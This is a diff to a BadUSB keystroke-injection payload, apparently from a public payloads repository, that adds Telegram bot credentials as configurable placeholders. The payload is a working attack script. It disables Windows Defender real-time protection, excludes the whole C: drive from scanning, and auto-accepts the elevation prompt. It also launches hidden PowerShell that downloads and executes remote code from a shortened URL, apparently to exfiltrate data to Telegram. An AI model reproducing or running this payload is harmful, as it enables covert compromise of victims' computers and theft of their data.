@@ -7,10 +7,14 @@ REM Version:	1.0
 REM Category:	Exfiltration
 REM Source: https://github.com/Mr-Proxy-source/BadUSB-Payloads
 
+REM Here you will have to put your telegram bot details
+DEFINE BOT_TOKEN your-bot-token
+DEFINE CHAT_ID your-chat-id
+
 DELAY 1500
 GUI r
 DELAY 500
-STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='bot-token'; $ci='chat-id'; irm https://t.ly/-qlYd | iex'"
+STRING powershell.exe -Command "Set-MpPreference -DisableRealtimeMonitoring $true; Add-MpPreference -ExclusionPath 'C:\'; Start-Sleep -Seconds 5; powershell -w h -NoP -Ep Bypass -Command '$bt='BOT_TOKEN'; $ci='CHAT_ID'; irm https://t.ly/-qlYd | iex'"
 CTRL-SHIFT ENTER
 DELAY 1000
 ALT y
